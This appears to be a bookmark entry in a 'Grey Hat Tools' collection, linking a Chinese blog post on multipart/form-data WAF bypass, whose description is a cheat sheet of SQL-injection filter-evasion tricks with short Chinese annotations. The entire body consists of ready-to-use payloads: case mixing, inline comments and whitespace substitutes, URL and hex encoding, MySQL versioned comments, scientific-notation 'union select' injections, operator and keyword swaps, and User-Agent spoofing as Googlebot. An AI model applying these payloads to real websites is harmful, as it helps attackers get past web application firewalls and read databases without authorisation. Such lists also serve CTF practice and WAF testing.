---
title: "http://xdxd.love/2015/12/18/%E9%80%9A%E8%BF%87multipart-form-data%E7%BB%95%E8%BF%87waf/"
description: "
Bypass WAF

select password => SelEcT password (大小寫)
select password => select/**/password (繞空白)
select password => s%65lect%20password (URLencode)
select password => select(password) (繞空白)
select password => select%0apassword (繞空白)

%09, %0a, %0b, %0c, %0d, %a0


select password from admin => select password /*!from*/ admin (MySQL註解)
information_schema.schemata => `information_schema`.schemata (繞關鍵字/空白)

 select xxx from`information_schema`.schemata


select pass from user where id='admin' => select pass from user where id=0x61646d696e (繞引號)

id=concat(char(0x61),char(0x64),char(0x6d),char(0x69),char(0x6e))


?id=0e2union select 1,2,3 (科學記號)

?id=1union select 1,2,3會爛
?id=0e1union(select~1,2,3) (~)
?id=.1union select 1,2,3 (點)


WHERE => HAVING (繞關鍵字)
AND => && (繞關鍵字)

OR => ||
= => LIKE
a = 'b' => not a > 'b' and not a < 'b'
> 10 => not between 0 and 10


LIMIT 0,1 => LIMIT 1 OFFSET 0 (繞逗號)

substr('kaibro',1,1) => substr('kaibro' from 1 for 1)


Multipart/form-data繞過


Example: Real World CTF 4th - Hack into Skynet


偽造 User-Agent

e.g. 有些 WAF 不封 google bot



"
url: "http://xdxd.love/2015/12/18/%E9%80%9A%E8%BF%87multipart-form-data%E7%BB%95%E8%BF%87waf/"
category: "Grey Hat Tools"
---
